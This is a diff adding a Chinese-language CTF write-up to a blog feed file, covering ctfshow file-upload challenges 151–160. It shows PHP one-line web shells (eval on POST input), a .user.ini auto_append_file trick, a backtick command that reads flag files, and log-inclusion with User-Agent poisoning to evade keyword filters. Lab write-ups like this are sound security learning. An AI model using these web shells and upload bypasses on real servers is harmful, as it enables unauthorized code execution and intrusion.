@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>ctfshow_web入门（文件上传151—156）</title>
+      <link href="/2023/01/23/ctfshow_web151~160/"/>
+      <url>/2023/01/23/ctfshow_web151~160/</url>
+      
+        <content type="html"><![CDATA[<span id="more"></span><h1 id="ctfshow-web入门（文件上传151—156）"><a href="#ctfshow-web入门（文件上传151—156）" class="headerlink" title="ctfshow_web入门（文件上传151—156）"></a>ctfshow_web入门（文件上传151—156）</h1><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><p>前段检测类型，burp抓包修改文件即可</p><p><img src="/2023/01/23/ctfshow_web151~160/image-20230123153030864.png" alt="image-20230123153030864"></p><p>查看上级目录，发现可疑文件</p><p><img src="/2023/01/23/ctfshow_web151~160/image-20230123154134221.png" alt="image-20230123154134221"></p><p>查看flag.php内容，得到flag</p><p><img src="/2023/01/23/ctfshow_web151~160/image-20230123154243203.png" alt="image-20230123154243203"></p><p>web152一样</p><h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p>利用user.ini进行文件上传绕过</p><p>上传一个含有一句话木马的图片，再上传<code>.user.ini</code>内容为<code>auto_append_file=&quot;shell.png&quot;</code></p><p><img src="/2023/01/23/ctfshow_web151~160/image-20230123155945931.png" alt="image-20230123155945931"></p><p><img src="/2023/01/23/ctfshow_web151~160/image-20230123160012304.png" alt="image-20230123160012304"></p><p>user.ini只对他同一目录下的文件起作用，也就是说，只有他同目录下有php文件才可以</p><p><img src="/2023/01/23/ctfshow_web151~160/image-20230123160443293.png" alt="image-20230123160443293"></p><p><img src="/2023/01/23/ctfshow_web151~160/image-20230123160519408.png" alt="image-20230123160519408"></p><h2 id="web154-155"><a href="#web154-155" class="headerlink" title="web154-155"></a>web154-155</h2><p>对文件内容进行了过滤，过滤了php</p><p><code>&lt;?=eval($_POST[&#39;attack&#39;]);?&gt;</code></p><p>后面跟上题一样</p><p><img src="/2023/01/23/ctfshow_web151~160/image-20230123161944841.png" alt="image-20230123161944841"></p><h2 id="web156-158"><a href="#web156-158" class="headerlink" title="web156-158"></a>web156-158</h2><p>在前面的基础上，过滤了[],直接用{}代替</p><p><code>&lt;?=eval($_POST&#123;&#39;attack&#39;&#125;);?&gt;</code></p><p><img src="/2023/01/23/ctfshow_web151~160/image-20230123162311924.png" alt="image-20230123162311924"></p><p><img src="/2023/01/23/ctfshow_web151~160/image-20230123162400083.png" alt="image-20230123162400083"></p><p><img src="/2023/01/23/ctfshow_web151~160/image-20230123162512161.png" alt="image-20230123162512161"></p><h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><p>过滤了括号，那用反引号就行，直接输出flag，反正知道flag在哪。。</p><?=`tac ../f*`?><h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><p>过滤了php、执行函数、反引号等</p><p>利用日志包含绕过，木马图片内容<?=include"/var/lo"."g/nginx/access.lo"."g"?>因为log被过滤了。所以用拼接绕过</p><p>上传完.user.ini和木马图片后</p><p>访问网站然后修改ua头信息即可</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+          <category> web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> web安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ctfshow_web入门SSRF</title>
       <link href="/2023/01/22/ctfshow-webSSRF351~360/"/>
       <url>/2023/01/22/ctfshow-webSSRF351~360/</url>
